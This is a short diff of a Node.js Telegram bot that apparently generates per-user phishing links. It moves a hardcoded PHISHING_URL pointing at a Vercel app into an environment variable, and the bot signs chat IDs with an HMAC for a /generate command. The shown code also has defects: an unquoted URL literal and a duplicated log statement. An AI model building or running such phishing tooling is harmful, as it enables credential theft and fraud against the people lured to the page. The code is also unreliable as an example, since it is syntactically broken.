@@ -4,7 +4,7 @@ require('dotenv').config();
 
 const token = process.env.TELEGRAM_BOT_TOKEN;
 const bot = new TelegramBot(token, {polling: true});
-const PHISHING_URL = https://ujicoba-self.vercel.app/
+const PHISHING_URL = process.env.PHISHING_URL; // URL Vercel Anda
 
 function generateToken(chatId) {
   const hmac = crypto.createHmac('sha256', process.env.SECRET_KEY);
@@ -34,4 +34,4 @@ bot.onText(/\/generate/, (msg) => {
   );
 });
 
-console.log("Bot Telegram started...");
+console.log("Bot Telegram started...");console.log("Bot Telegram started...");
